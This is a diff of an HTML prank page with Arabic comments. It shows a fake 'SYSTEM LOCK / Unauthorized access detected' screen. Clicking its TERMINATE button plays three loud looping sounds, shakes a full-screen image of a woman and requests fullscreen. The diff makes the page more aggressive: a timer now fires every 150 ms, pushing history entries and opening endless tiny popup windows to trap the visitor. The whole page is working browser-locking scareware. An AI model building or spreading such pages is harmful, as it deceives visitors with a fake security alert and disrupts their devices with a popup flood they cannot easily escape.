@@ -3,61 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SECURITY ALERT ☠️</title>
+    <title>☠️ SYSTEM LOCK ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* الصورة كبيرة تعمر الشاشة ومستعدة للهبال سواسوة */
+        /* صورة المرأة: مخفية في البداية وتعمر الشاشة سواسوة */
         #madImg { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 10; display: none;
             will-change: transform;
         }
 
+        /* واجهة الزر الأحمر سواسوة */
         #ui { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000; z-index: 1000; display: flex; 
             flex-direction: column; justify-content: center; align-items: center;
-            font-family: monospace; color: #f00; text-align: center;
+            font-family: 'Courier New', monospace; color: #f00; text-align: center;
         }
-        .btn { 
-            background: #f00; color: #000; border: none; padding: 25px 60px; 
+        .skull { font-size: 50px; margin: 20px; }
+        .btn-red { 
+            background: #f00; color: #000; border: none; width: 250px; height: 80px;
             font-weight: bold; font-size: 24px; cursor: pointer; margin-top: 30px;
+            box-shadow: 0 0 20px #f00; text-transform: uppercase;
         }
+        .blink { animation: b 0.1s infinite; }
+        @keyframes b { 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="startMadness()">
+<body>
 
     <div id="ui">
-        <h1 style="animation: blink 0.1s infinite;">☠️ SYSTEM LOCK ☠️</h1>
-        <p>Unauthorized access detected.<br>Click to terminate all processes.</p>
-        <button class="btn">TERMINATE</button>
+        <div class="skull">☠️ <span style="color:red; font-size:40px;">SYSTEM LOCK</span> ☠️</div>
+        <p style="color:#888;">Unauthorized access detected.<br>Click to terminate all processes.</p>
+        <button class="btn-red" onclick="igniteMadness()">TERMINATE</button>
     </div>
 
     <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="audioBox">
-        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
-        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
-        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
+    <div id="audioVault">
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
     </div>
 
     <script>
         let aCtx, analyser, data;
         const img = document.getElementById('madImg');
+        const ui = document.getElementById('ui');
 
-        function startMadness() {
-            // 1. إطلاق الأصوات الـ 3 سواسوة
-            const audios = document.querySelectorAll('.t');
+        function igniteMadness() {
+            // 1. إطلاق الأصوات سواسوة
+            const audios = document.querySelectorAll('.s');
             audios.forEach(a => { a.volume = 1.0; a.play(); });
 
-            document.getElementById('ui').style.display = 'none';
+            // 2. إخفاء الزر وإظهار المرأة سواسوة
+            ui.style.display = 'none';
             img.style.display = 'block';
+            
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // 2. تفعيل محرك التخبيط (Jitter) سواسوة
+            // 3. محرك الرعشة (التخبيط) سواسوة
             if (!aCtx) {
                 aCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const source = aCtx.createMediaElementSource(audios[1]); // نربط الحركة بصرخة الدجاجة
+                const source = aCtx.createMediaElementSource(audios[1]); // الحركة مربوطة بصرخة الدجاجة
                 analyser = aCtx.createAnalyser();
                 analyser.fftSize = 64;
                 data = new Uint8Array(analyser.frequencyBinCount);
@@ -65,31 +74,30 @@
                 analyser.connect(aCtx.destination);
                 
                 if (aCtx.state === 'suspended') aCtx.resume();
-                loop();
+                renderMadness();
             }
 
-            // 3. منع الهروب سواسوة
+            // 4. نظام الحبس الرقمي سواسوة
             setInterval(() => {
                 history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 200);
+            }, 150);
         }
 
-        function loop() {
+        function renderMadness() {
             analyser.getByteFrequencyData(data);
             let vol = data[0]; 
 
-            // 4. الحركة المطلوبة: المرأة ترعد وتتخبط بقوة سواسوة
-            const power = (vol / 255) * 90; 
-            const x = (Math.random() - 0.5) * power * 6;
-            const y = (Math.random() - 0.5) * power * 6;
+            // 5. معادلة التخبيط الهستيري سواسوة
+            const power = (vol / 255) * 100; // زدنا القوة
+            const x = (Math.random() - 0.5) * power * 7;
+            const y = (Math.random() - 0.5) * power * 7;
             const r = (Math.random() - 0.5) * power;
-            const s = 1 + (vol / 255) * 0.6;
+            const s = 1 + (vol / 255) * 0.7;
 
             img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
-            requestAnimationFrame(loop);
+            requestAnimationFrame(renderMadness);
         }
     </script>
-    <style> @keyframes blink { 50% { opacity: 0; } } </style>
 </body>
 </html>
